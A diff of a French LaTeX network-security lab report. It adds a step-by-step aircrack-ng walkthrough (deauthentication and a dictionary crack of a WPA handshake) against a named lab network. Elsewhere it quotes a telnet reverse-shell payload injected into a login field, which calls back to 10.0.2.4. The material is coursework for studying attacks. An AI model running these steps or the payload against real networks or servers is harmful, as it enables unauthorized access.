@@ -47,8 +47,8 @@ Une faiblesse au niveau du protocole TKIP a été découverte par des chercheurs
 On peut également nommer les différentes attaques existantes sur ce protocole :
 
 \begin{itemize}
-\item 	Attaque Beck \& Tews
-\item 	Attaque par force brute
+\item	Attaque Beck \& Tews
+\item Attaque par force brute
 \end{itemize}
 
 \subsubsection{Le protocole WPA2}
@@ -74,6 +74,79 @@ On peut recenser les différentes attaques existantes sur ce protocole :
 
 
 \subsection{Aircrack-ng}
+Sans une machine Linux, il nous a été impossible de réaliser des captures d'écran et d'attaquer le réseau Dinf-ift606-tpxa. Cependant vous trouverez ci-dessous, dans un premier temps, les étapes que nous aurions réalisé sur une machine Linux, puis les étapes que nous avons réalisé sans succès sur une machine MAC. 
+
+\subsubsection{Linux}
+\textbf{Première étape : Passer l'interface sans-fil en mode monitor}~\\
+Afin d'écouter les réseaux WiFi environnants, on commence par passer notre carte WiFi en mode monitor. Pour ce renseigner sur notre interface WiFi, on utilise la commande suivante : \textit{iwconfig}. On récupère le nom de notre interface, dans la plupart des cas, sur Linux, elle s'appelle wlan0. Nous pouvons alors passer la carte WiFi en mode monitor à l'aide de la commande suivante : \textit{airmon-ng start wlan0}. Si cette commande se déroule correctement, la console retourne "monitor mode enabled on mon0" pour nous informer que la carte WiFi est bien en mode monitor et que l'interface s'appelle mon0.~\\
+
+\textbf{Deuxième étape : Ecoute des réseaux WiFi}~\\
+Afin d'écouter les réseaux WiFi, on utilise la commande airodump-ng. On lance une première fois la commande suivante : "airodump-ng mon0" afin d'écouter tous les réseaux WiFi. Pour faire un premier tri, on peux ensuite afficher seulement les réseaux WiFi qui nous intéresse ici, ce sont ceux encryptés en WPA \textit{airodump-ng --encrypt wpa mon0}. On repère le réseau que l'on cherche à attaquer et on récupère son adresse mac. Notre cible est ici le réseau Dinf-ift606-tpxa, il a pour adresse MAC 00:1c:f0:ea:e5:b3 et il émet sur le canal 9. Afin de focaliser notre écoute sur ce réseau et d'enregistrer des données de capture on exécute la commande suivante : \textit{airodump-ng -w out --encrypt wpa -c 9 --bssid 00:1c:f0:ea:e5:b3 mon0}. Les données seront enregistrées dans le fichier out. Grâce à cette commande, on peut voir si des stations sont connectées, la capture d'un handshake ne peut être réalisée que si une station valide est connectée au point d'accès.~\\
+
+\textbf{Troisième étape : Attaque active}~\\
+Une solution serait d'écouter le réseau pendant plusieurs heures en attendant qu'un client se connecte afin de capturer un handshake qui est émis par le point d'accès et la station lorsque celle ci se connecte. Mais aircrack-ng propose une méthode d'attaque active qui consiste à utiliser la commande aireplay-ng et son attaque -0 pour forcer la déconnexion du client et capturer le handshake lorsqu'il se reconnecte. Pour utiliser cette commande, on commence par ouvrir deux nouveaux shell, dans le premier on entre la commande suivante : \textit{aireplay-ng -0 0 -a 00:1c:f0:ea:e5:b3 mon0 mon0} et dans le second \textit{aireplay-ng -0 0 -a 00:1c:f0:ea:e5:b3 -c MAC\_STATION mon0}. ~\\
+\begin{enumerate}
+\item Le paramètre -0 signifie que l'on effectue une attaque de désauthentification ;
+\item le second 0 signifie que lorsque l'envoi de paquets de déauth sera infini et qu'il faudra arrêter l'attaque avec Ctrl + c ;
+\item le paramètre -a correspond à l'adresse MAC du réseau Dinf-ift606-tpxa ;
+\item le paramètre -c correspond normalement à l'adresse MAC de la station.
+\end{enumerate} 
+On lance ces deux commandes en même temps, on attends quelques instant puis on arrête l'exécution.
+Si l'attaque à réussi on devrait voir apparaitre un WPA handshake en haut à droite de la fenêtre arodump-ng. Selon la qualité de la connexion, il se peut que nous devions recommencer l'attaquer plusieurs fois avant de capture un handshake.~\\
+
+\textbf{Quatrième étape : Bruteforce du handshake}~\\
+Maintenant que le handshake a été capturé, on peut stopper airodump-ng et lancer l'attaque à l'aide d'un dictionnaire de mot de passe. On lance la commande \textit{aircrack-ng -w lower.lst out-01.cap}. 
+Le crack se lance alors et aircrack-ng va tester tous les mots de passe contenus dans le fichier jusqu'à trouver le bon. 
+Une fois qu'il a trouvé le mot de passe, il affiche KEY FOUND ! avec la clé du réseau.~\\
+
+
+\subsubsection{Mac}
+
+\textbf{Première et seconde étape : Mode monitor et écoute des réseaux WiFi}~\\
+Sur Mac, il est impossible d'utiliser la commande airmon-ng, cependant il plusieurs alternatives à cette commande. 
+La première est la commande \textit{airport}.
+Pour afficher les réseaux WiFi captés par la carte WiFi de l'ordinateur, on utilise la commande \textit{airport -s} (\textsc{Figure \ref{fig:airport}}) 
+\begin{figure}[hbtp]
+        \centering \includegraphics[scale=0.4]{Exercice1/airport.png}
+        \caption{Commande airport -s}
+         \label{fig:airport}
+\end{figure}
+Puis pour passer en mode monitor on repère le canal du réseau que l'on veut attaquer et on utilise la commande \textit{airport sniff en0 9}. en0 est le nom de l'interface et 9 est le canal du réseau que l'on cherche à attaquer. (\textsc{Figure \ref{fig:airport2}}) 
+
+\begin{figure}[hbtp]
+        \centering \includegraphics[scale=0.4]{Exercice1/airport2.png}
+        \caption{Commande airport sniff}
+         \label{fig:airport2}
+\end{figure}
+
+La seconde alternative à la commande airmon-ng est le logiciel KisMac. Sur ce logiciel, si on configure dans les préférences les drivers utilisés par le PC (\textsc{Figure \ref{fig:driverKM}}) , et qu'on lance un scanner, le mode monitor démarre et les réseaux captés sont affichés. (\textsc{Figure \ref{fig:reseauKM}}). 
+
+\begin{figure}[hbtp]
+        \centering \includegraphics[scale=0.4]{Exercice1/driverKM.png}
+        \caption{Configuration de KisMac}
+         \label{fig:driverKM}
+\end{figure}
+
+\begin{figure}[hbtp]
+        \centering \includegraphics[scale=0.4]{Exercice1/reseauKM.png}
+        \caption{Scan de KisMac}
+         \label{fig:reseauKM}
+\end{figure}
+~\\
+\textbf{Troisème étape : Attaque active}~\\
+C'est sur cette étape que le système d'exploitation OS X n'offre pas les mêmes services que Linux. En effet, il est impossible d'utiliser la commande aireplay-ng, tout du moins elle ne donne aucun résultat. De même, le logiciel KisMac bien qu'il propose le même type d'attaque que la commande aireplay-ng ne fonctionnait pas sur notre machine. 
+Sans cette possibilité de forcer la désauthentification pour capturer un handshake, il ne nous restait qu'une seule solution : l'attaque passive et l'attente d'un handshake.
+Malheureusement, nous n'avons pas réussi à capturer un handshake, la quatrième étape n'a donc pas été fructueuse.~\\
+
+\textbf{Quatrième étape : Bruteforce du handshake}~\\
+Sur MAC, on lance également la commande \textit{aircrack-ng -w lower.lst airportSniffXMDMoY.cap}. Ici airportSniffXMDMoY.cap est le nom de notre capture. 
+Malheuresement, sans handshake, aircrack ne parvient pas à trouver la clé (\textsc{Figure \ref{fig:last}}). ~\\
+\begin{figure}[hbtp]
+        \centering \includegraphics[scale=0.4]{Exercice1/echec.png}
+        \caption{Échec de aircrack-ng}
+         \label{fig:last}
+\end{figure}
+
 \newpage
 \section{Chiffrement et signature}
 \subsection{Génération d'une paire de clé RSA}
@@ -126,7 +199,7 @@ Pour chiffrer la partie privée générée, on exécute la commande suivante : \
 \end{figure}
 
 \subsection{Chiffrement d'un message}
-Nous allons maintenant chiffrer le fichier message.txt (\textsc{Figure \ref{fig:message}}) qui contient le message "OpenSSL is really cool!!!". Pour se faire, nous exécutons la commande suivante : \textit{rsautl -encrypt -in message.txt -inkey cle.pem -out messageC.txt} (\textsc{Figure \ref{fig:cde3}}). Le fichier messageC.txt contient le message crypté (\textsc{Figure \ref{fig:crypt}}).
+Nous allons maintenant chiffrer le fichier message.txt (\textsc{Figure \ref{fig:message}}) qui contient le message "OpenSSL is really cool!!!". Pour se faire, nous exécutons la commande suivante : \textit{rsautl -encrypt -in message.txt -pubin -inkey clePublique.pem -out messageC.txt} (\textsc{Figure \ref{fig:cde3}}). Le fichier messageC.txt contient le message crypté (\textsc{Figure \ref{fig:crypt}}).
 \begin{figure}[hbtp]
     \begin{minipage}[b]{0.4\linewidth}
         \centering \includegraphics[scale=0.4]{Capture/question4.png}
@@ -244,7 +317,7 @@ Le hacker reçoit une réponse positive de la part du serveur et peut ensuite te
 \end{figure}
 
 Pour se connecter il rentre une ligne de commande particulière à la place du champ « user ».  (\textsc{Figure \ref{fig:7}})
-Cette ligne est /=`nohup sh -c '(sleep 4428|telnet 10.0.2.4 5002|while : ; do sh \&\& break; done 2>\&1|telnet 10.0.2.4 5002 >/dev/null 2>\&1 \&)'`
+Cette ligne est \textit{/=`nohup sh -c '(sleep 4428|telnet 10.0.2.4 5002|while : ; do sh \&\& break; done 2>\&1|telnet 10.0.2.4 5002 >/dev/null 2>\&1 \&)'`}
 Elle permet de lancer un processus qui restera actif même après la déconnexion de l’utilisateur. Ce processus émule un Shell à distance, c’est-à-dire qu’il demande au serveur linux d’ouvrir un Shell sur la machine du hacker. Ceci a pour but de pouvoir exécuter des commandes saisies au clavier sur une machine distante. De plus, le hacker redirige toutes les sorties (Out, Erreurs) vers /dev/null.
 \vspace{2cm}
  \begin{figure}[h!]
@@ -293,6 +366,7 @@ Il y a donc plusieurs trames qui sont envoyées. Le hacker va faire une requête
          \label{fig:13}
 \end{figure}
 
+\newpage
 Puis le serveur va émettre un paquet spécial de broadcast sur le réseau local 255.255.255.255  (\textsc{Figure \ref{fig:13}}).
 
 \begin{figure}[h!]
@@ -318,7 +392,7 @@ En réponse à cette requête, le serveur DHCP va émettre une réponse proposan
 \end{figure}
 
 Le hacker va alors sélectionner une des offres reçues et en informer le serveur DHCP. Le hacker demande au serveur la validation de cette adresse IP pour qu’il soit informé qu’elle n’est plus libre (\textsc{Figure \ref{fig:16}}).
-\vspace{2cm}
+\vspace{0cm}
 \begin{figure}[h!]
         \centering \includegraphics[scale=0.9]{Exo3/17.png}
         \caption{}
@@ -328,12 +402,12 @@ Le hacker va alors sélectionner une des offres reçues et en informer le serveu
 Le serveur va confirmer la validation de l’adresse IP (\textsc{Figure \ref{fig:17}}).
 
 \begin{figure}[h!]
-        \centering \includegraphics[scale=0.9]{Exo3/18.png}
+        \centering \includegraphics[scale=0.8]{Exo3/18.png}
         \caption{}
          \label{fig:18}
 \end{figure}
 
-Pour des raisons d’optimisation des ressources réseau, les adresses IP sont délivrées avec une date de début et une date de fin de validité. C’est ce qu’on appelle un « bail ». Ici, le hacker voit son bail arriver à terme et demande alors au serveur de prolonger celui-ci par un DHCP Request (\textsc{Figure \ref{fig:17}}).
+Pour des raisons d’optimisation des ressources réseau, les adresses IP sont délivrées avec une date de début et une date de fin de validité. C’est ce qu’on appelle un « bail ». Ici, le hacker voit son bail arriver à terme et demande alors au serveur de prolonger celui-ci par un DHCP Request (\textsc{Figure \ref{fig:18}}).
 
 \begin{figure}[h!]
         \centering \includegraphics[scale=0.9]{Exo3/19.png}
@@ -347,9 +421,11 @@ Pour des raisons d’optimisation des ressources réseau, les adresses IP sont d
          \label{fig:20}
 \end{figure}
 
-Puis le hacker exécute la commande « echo god is good » 
+Puis le hacker exécute la commande « echo god is good » sur le terminal du serveur. (\textsc{Figure \ref{fig:19} et \ref{fig:20}}).
+
+Ici, la technique d’attaque a été de pouvoir émuler un terminal distant du serveur lors de la connexion à celui-ci. Ceci a donc pu permettre au hacker de s’introduire sur le serveur et d’y exécuter des commandes.
 
 
 \newpage
-\listoffigures
+
 \end{document}
